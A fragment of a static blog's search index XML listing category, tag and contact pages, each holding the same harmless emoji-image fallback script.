      <link href="/LawlietLW.github.io/categories/index.html"/>
      <url>/LawlietLW.github.io/categories/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/LawlietLW.github.io/tags/index.html"/>
      <url>/LawlietLW.github.io/tags/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/LawlietLW.github.io/tags/index-1.html"/>
      <url>/LawlietLW.github.io/tags/index-1.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>contact</title>
      <link href="/LawlietLW.github.io/contact/index.html"/>
      <url>/LawlietLW.github.io/contact/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/LawlietLW.github.io/categories/index-1.html"/>
      <url>/LawlietLW.github.io/categories/index-1.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
  
</search>
